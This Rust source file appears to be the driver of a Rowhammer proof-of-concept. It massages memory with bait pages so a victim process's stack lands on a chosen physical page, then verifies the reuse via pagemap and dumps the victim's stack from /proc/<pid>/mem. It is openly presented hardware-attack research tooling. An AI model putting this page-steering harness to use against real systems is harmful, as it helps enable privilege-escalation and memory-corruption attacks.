use std::{
    fs::OpenOptions,
    io::{Read, Seek, SeekFrom},
    ptr::null_mut,
    time::Duration,
};

use anyhow::bail;
use bs_poc::{
    allocator::{util::mmap, ConsecAllocator, Pfn, Spoiler},
    hammerer::blacksmith::blacksmith_config::BlacksmithConfig,
    memory::{
        mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, GetConsecPfns, MemBlock,
        PageMapInfo, PfnResolver,
    },
    util::{KB, MB, PAGE_SIZE},
    victim::{stack_process::InjectionConfig, HammerVictim, StackProcess},
};
use clap::{arg, Parser};
use libc::{mprotect, PROT_READ};
use log::{debug, info, warn};
use pagemap::{MapsEntry, PageMap};

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<Option<usize>>,
    #[arg(short = 'b', long)]
    bait_before: Option<usize>,
    #[arg(short = 'a', long)]
    bait_after: Option<usize>,
    #[arg(long, default_value = "mmap")]
    alloc_strategy: AllocStrategy,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    target: Vec<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum AllocStrategy {
    Spoiler,
    Pfn,
    Mmap,
}

fn main() -> anyhow::Result<()> {
    env_logger::init();
    const PAGE_SIZE: usize = 4096;
    //const NUM_PAGES: usize = 1 << 21; // 8 GB
    //const ALLOC_SIZE: usize = NUM_PAGES * PAGE_SIZE;
    let args = CliArgs::parse();
    info!("CLI args: {:?}", args);
    let bs_config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&bs_config);
    //0..64 {
    //let bait_before = args.bait_before;
    let bait_before_range = args.bait_before.map(|b| b..b + 1).unwrap_or(0..30);
    let bait_after_range = args.bait_after.map(|b| b..b + 1).unwrap_or(0..30);
    for bait_before in bait_before_range {
        for bait_after in bait_after_range.clone() {
            println!("bait_before,bait_after: {},{}", bait_before, bait_after);
            for _ in 0..args.repeat.unwrap_or(Some(1)).unwrap_or(2_usize.pow(32)) {
                // allocate bait page, get PFN
                let x = match args.alloc_strategy {
                    AllocStrategy::Spoiler => {
                        let mut spoiler = Spoiler::new(mem_config, bs_config.threshold, None);
                        spoiler.alloc_consec_blocks(4 * MB)?
                    }
                    AllocStrategy::Pfn => {
                        let mut pfn = Pfn::new();
                        pfn.alloc_consec_blocks(4 * MB)?
                    }
                    AllocStrategy::Mmap => {
                        let x: *mut u8 = mmap(null_mut(), 4 * MB);
                        if x.is_null() {
                            bail!("Failed to allocate memory");
                        }
                        ConsecBlocks::new(vec![MemBlock::new(x, 4 * MB)])
                    }
                };
                let flippy_page = unsafe { x.ptr().byte_add(64 * KB) as *mut libc::c_void };
                debug!("Collecting PFNs...");
                let target_pfn = flippy_page.pfn()? >> 12;
                //x.log_pfns();
                debug!("PFNs collected");

                info!("PFN: {:?}", flippy_page.pfn());
                info!("Launching victim");
                let mut victim = StackProcess::new(
                    &args.target,
                    InjectionConfig {
                        flippy_page,
                        flippy_page_size: PAGE_SIZE,
                        bait_count_after: bait_after,
                        bait_count_before: bait_before,
                    },
                )?;
                let pid = victim.pid().expect("Failed to get child PID");
                std::thread::sleep(Duration::from_millis(100));
                let flippy_region = find_flippy_page(target_pfn, pid)?;
                if let Some(flippy_region) = &flippy_region {
                    info!("Flippy page reused in region {:?}", flippy_region);
                } else {
                    warn!("Flippy page not reused");
                }
                println!("{:?}", flippy_region);
                let output = match victim.check() {
                    Ok(output) => output,
                    Err(e) => e.to_string(),
                };
                if output.contains(&format!("{:x}", target_pfn)) {
                    bail!("YES MAN: {},{}", bait_before, bait_after);
                }
                info!("Child output:\n{}", output);
                x.dealloc();
            }
        }
    }
    Ok(())
}

fn read_memory_from_proc(pid: u32, va: u64, size: u64) -> std::io::Result<Vec<u8>> {
    // Construct the path to the process's memory file
    let path = format!("/proc/{}/mem", pid);
    let mut file = OpenOptions::new().read(true).open(path)?;

    // Seek to the virtual memory address
    file.seek(SeekFrom::Start(va))?;

    // Read the specified number of bytes into a buffer
    let mut buffer = vec![0; size as usize];
    file.read_exact(&mut buffer)?;

    Ok(buffer)
}

#[derive(Debug)]
struct FlippyPage {
    maps_entry: MapsEntry,
    region_offset: usize, // page offset in the region
}

fn find_pattern(vec: &[u8], pattern: u8, length: usize) -> Option<usize> {
    let target_sequence: Vec<u8> = vec![pattern; length];
    vec.windows(length)
        .position(|window| window == target_sequence.as_slice())
}

fn find_flippy_page(target_page: u64, pid: u32) -> anyhow::Result<Option<FlippyPage>> {
    let pmap = PageMapInfo::load(pid as u64)?.0;
    let mut flippy_region = None;
    for (map, pagemap) in pmap {
        for (idx, (va, pmap)) in pagemap.iter().enumerate() {
            let pfn = pmap.pfn();
            match pfn {
                Ok(pfn) => {
                    if target_page == pfn {
                        flippy_region = Some(FlippyPage {
                            maps_entry: map.0.clone(),
                            region_offset: idx,
                        });
                        info!("Region: {:?}", map.0);
                        debug!("Region size: {}", map.0.memory_region().size());
                        info!("[{}]  {:#x}    {:#x} [REUSED TARGET PAGE]", idx, va, pfn);
                        if let Some("[stack]") = map.0.path() {
                            let mut stack_contents = String::new();
                            let contents = read_memory_from_proc(pid, *va, PAGE_SIZE as u64);
                            match contents {
                                Ok(contents) => {
                                    match find_pattern(&contents, 0b10101010, PAGE_SIZE) {
                                        Some(offset) => {
                                            info!("Found pattern at offset {}", offset);
                                        }
                                        None => {
                                            info!("Pattern not found");
                                        }
                                    }
                                    for (i, byte) in contents.iter().enumerate() {
                                        stack_contents += &format!("{:02x}", byte);
                                        if i % 8 == 7 {
                                            stack_contents += " ";
                                        }
                                        if i % 64 == 63 {
                                            stack_contents += "\n";
                                        }
                                    }
                                    info!("Content:\n{}", stack_contents);
                                }
                                Err(e) => {
                                    info!("Failed to read stack contents: {}", e);
                                }
                            }
                        }
                    } else {
                        //info!("[{}]  {:#x}    {:#x}", idx, va, pfn);
                    }
                }
                Err(e) => match e {
                    pagemap::PageMapError::PageNotPresent => {
                        //info!("[{}]  {:#x}    ???", idx, va);
                    }
                    _ => bail!(e),
                },
            }
        }
    }
    Ok(flippy_region)
}
